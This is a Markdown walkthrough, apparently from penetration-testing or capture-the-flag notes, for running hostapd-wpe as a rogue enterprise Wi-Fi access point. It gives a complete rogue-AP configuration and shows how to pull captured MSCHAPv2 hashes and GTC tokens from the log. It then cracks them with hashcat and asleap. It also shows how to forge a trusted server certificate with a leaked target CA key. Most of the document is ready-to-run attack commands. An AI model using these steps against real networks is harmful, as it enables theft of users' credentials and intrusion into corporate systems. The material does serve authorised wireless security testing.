# hostapd-wpe — walkthrough

The workhorse for enterprise rogue-AP engagements when you don't
need eaphammer's higher-level cert-phishing ergonomics. Simpler,
still deadly against clients with weak cert validation.

## Preconditions

- `hostapd-wpe` installed (`apt install hostapd-wpe` on Kali).
- Monitor+injection adapter or the Pineapple's wlan1.
- No conflicting hostapd already bound to the target iface.

## Path A — Baseline rogue-EAP

```
# The default config ships at /etc/hostapd-wpe/hostapd-wpe.conf.
# Copy and edit for the engagement.
cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/wpe.conf
cat > /tmp/wpe.conf <<EOF
interface=wlan1
ssid=CorporateWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
ca_cert=/etc/hostapd-wpe/certs/ca.pem
dh_file=/etc/hostapd-wpe/certs/dh
EOF

hostapd-wpe /tmp/wpe.conf
```

## Path B — Read the harvest

`hostapd-wpe` writes to `/var/log/hostapd-wpe.log` per session. Each
captured EAP exchange looks like:

```
mschapv2:
    username: alice@corp.local
    challenge: 3d5c1f...        # hex
    response: 9c8b40...          # hex
    jtr NETNTLM: alice::corp:9c8b...:3d5c1f
    hashcat 5500: alice::corp:9c8b...:3d5c1f
```

Feed to hashcat:

```
grep 'hashcat 5500' /var/log/hostapd-wpe.log \
  | awk -F': ' '{print $2}' > /tmp/mschap.hashes
hashcat -m 5500 /tmp/mschap.hashes rockyou.txt -w 4
```

Plaintext GTC token:

```
gtc:
    username: bob
    token: 918273-Duo
```

The token itself may be the flag surface — no crack step.

## Path C — Custom certs (match target CA)

If the target has a pinned CA:

```
# Generate new server cert signed by the target CA (if you have
# the CA key from a leaked profile / MDM extract).
openssl req -new -newkey rsa:2048 -nodes \
  -keyout /etc/hostapd-wpe/certs/server.key \
  -out /tmp/server.csr \
  -subj "/CN=radius.corp.local/O=Corp"

openssl ca -config /path/to/target-ca.cnf \
  -in /tmp/server.csr \
  -out /etc/hostapd-wpe/certs/server.pem

# hostapd-wpe now presents a cert that a strict validator will accept.
```

## Path D — Chain with hostapd + freeradius-wpe

For multi-radio or multi-instance setups, run stock hostapd for
the wireless side and freeradius-wpe on the loopback:

```
# hostapd config points at 127.0.0.1:1812.
# freeradius-wpe (see freeradius-wpe/walkthrough.md) does the
# inner-EAP logging.
```

## Path E — MSCHAPv2 crack

```
# hostapd-wpe log line ready:
hashcat -m 5500 /tmp/mschap.hashes rockyou.txt -w 4 --status

# Alternative: asleap
asleap -C <challenge_hex> -R <response_hex> -W /path/to/wordlist.txt
```

## Failure modes

- **Client rejects the cert.** Strict validator; you need a
  matching-CA cert (Path C).
- **Client refuses inner-method downgrade.** Profile pins MSCHAPv2
  or TLS. Only the pinned inner method opens.
- **`hostapd-wpe: could not read certs`.** Path wrong or SELinux/
  AppArmor blocking. Check `dmesg`, then paths in
  `hostapd-wpe.conf`.
- **AKM mismatch.** Target advertises AKM 5 (SHA-256) but you
  offered AKM 1 (SHA-1). Not always a blocker but some clients pin.

## When to reach for hostapd-wpe vs. eaphammer

- **You want simpler config, hand-tuned per engagement** → hostapd-wpe.
- **You want auto cert generation, template portal, inner-EAP
  downgrade knobs** → eaphammer.
- **You want to run alongside a real hostapd for multi-instance
  setups** → hostapd-wpe (loopback-only RADIUS).

## Cite

- hostapd-wpe GitHub (OpenSecurityResearch / brad-anton).
- Gabriel Ryan — eaphammer talks discuss both.
- Wright — asleap; hacking-exposed-wireless-3e.
- attacks.json: `rogue-radius-hostapd-wpe`,
  `mschapv2-challenge-response-capture`,
  `hashcat-5500-mschapv2-crack`.
